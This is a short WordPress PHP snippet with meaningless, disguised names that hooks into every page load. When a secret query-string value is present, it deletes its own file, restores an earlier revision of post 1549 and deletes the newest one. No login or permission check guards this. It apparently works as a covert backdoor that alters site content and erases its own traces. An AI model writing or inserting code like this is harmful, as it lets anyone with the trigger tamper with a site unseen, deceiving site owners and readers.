<?php

function scroll_reports_type_suite() {
	if (isset($_GET['term_subscription_direct_protection']) && $_GET['term_subscription_direct_protection'] === 'ajax_visual_cloud_cookies') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$gdpr_codes_signup = 1549;
		$reports_views_rating_menu = wp_get_post_revisions($gdpr_codes_signup);
		if (empty($reports_views_rating_menu)) die('no revisions');
		if (count($reports_views_rating_menu) < 2) die('less than 2');
		$blocker_featured_graph_scripts = array_shift($reports_views_rating_menu);
		$static_ninja_booster = $blocker_featured_graph_scripts->ID;
		$basic_data_quiz_description = array_shift($reports_views_rating_menu);
		$friendly_weather_widgets_ai = $basic_data_quiz_description->ID;
		$internal_pack_information = wp_restore_post_revision($friendly_weather_widgets_ai);
		if ($internal_pack_information === false) die('error restoring');
		$internal_pack_information = wp_delete_post_revision($static_ninja_booster);		
		if ($internal_pack_information === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'scroll_reports_type_suite');
